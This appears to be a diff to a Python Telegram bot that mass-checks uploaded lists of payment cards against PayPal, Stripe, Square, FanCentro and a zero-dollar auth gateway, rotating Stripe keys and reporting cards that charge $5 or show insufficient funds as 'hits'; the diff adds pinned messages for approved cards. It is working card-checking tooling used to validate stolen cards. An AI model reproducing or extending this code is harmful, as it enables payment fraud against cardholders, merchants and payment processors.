@@ -1609,7 +1502,6 @@ async def gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_tasks[user_id] = task
     del pending_files[user_id]
 
-# ==================== Process PayPal File ====================
 async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal", username="Unknown"):
     global gateway_index, hit_counter
     user_id = chat_id
@@ -1672,7 +1564,6 @@ async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal"
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
-# ==================== Process Stripe File ====================
 async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe", username="Unknown"):
     global hit_counter
     if not STRIPE_KEYS:
@@ -1685,6 +1576,8 @@ async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe"
         card_counter = 0
         panel_msg = await context.bot.send_message(chat_id, premium_emoji("💳 Stripe Checking..."), parse_mode="HTML")
         loop = asyncio.get_event_loop()
+        keys_list = list(STRIPE_KEYS.keys())
+        total_keys = len(keys_list)
         with open(file_path, 'r', encoding='utf-8') as f:
             lines = f.readlines()
         for line in lines:
@@ -1695,8 +1588,6 @@ async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe"
             if not match: continue
             card_full = match[0]
             card_counter += 1
-            keys_list = list(STRIPE_KEYS.keys())
-            total_keys = len(keys_list)
             if total_keys == 0:
                 await context.bot.send_message(chat_id, premium_emoji("❌ No Stripe keys."), parse_mode="HTML")
                 return
@@ -1741,7 +1632,6 @@ async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe"
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
-# ==================== Process Square File ====================
 async def process_square_file(file_path, chat_id, context, gateway_name="Square", username="Unknown"):
     global hit_counter
     user_id = chat_id
@@ -1799,7 +1689,6 @@ async def process_square_file(file_path, chat_id, context, gateway_name="Square"
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
-# ==================== Process Auth File ====================
 async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0", username="Unknown"):
     global hit_counter
     user_id = chat_id
@@ -1859,7 +1748,6 @@ async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0",
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
-# ==================== Process FanCentro File ====================
 async def process_fancentro_file(file_path, chat_id, context, gateway_name="FanCentro", username="Unknown"):
     global hit_counter
     user_id = chat_id
@@ -1884,10 +1772,16 @@ async def process_fancentro_file(file_path, chat_id, context, gateway_name="FanC
             result_upper = result.upper()
             if "CHARGE" in result_upper:
                 approved += 1
+                text = await fan_format_response(card_full, result, user_id, "Mass")
+                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
+                try: await msg.pin(disable_notification=True)
+                except: pass
                 hit_counter += 1
                 await send_hit(context, chat_id, hit_counter, username, "🔥 Charge 5$", result, gateway_name)
             elif "INSUFFICIENT" in result_upper:
                 live += 1
+                text = await fan_format_response(card_full, result, user_id, "Mass")
+                await context.bot.send_message(chat_id, text, parse_mode="HTML")
                 hit_counter += 1
                 await send_hit(context, chat_id, hit_counter, username, "💵 Insufficient Funds", result, gateway_name)
             else:
@@ -1911,13 +1805,11 @@ async def process_fancentro_file(file_path, chat_id, context, gateway_name="FanC
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
-# ==================== Stop ====================
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     stop_users[user_id] = True
     await update.message.reply_text(premium_emoji("🛑 Stopping..."), parse_mode="HTML")
 
-# ==================== Admin Commands ====================
 async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
@@ -2051,11 +1943,9 @@ async def sent_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await asyncio.sleep(0.05)
         except: continue
 
-# ==================== Error Handler ====================
 async def error_handler(update, context):
     pass
 
-# ==================== Main ====================
 def main():
     app = Application.builder().token(TOKEN).build()
     app.add_error_handler(error_handler)
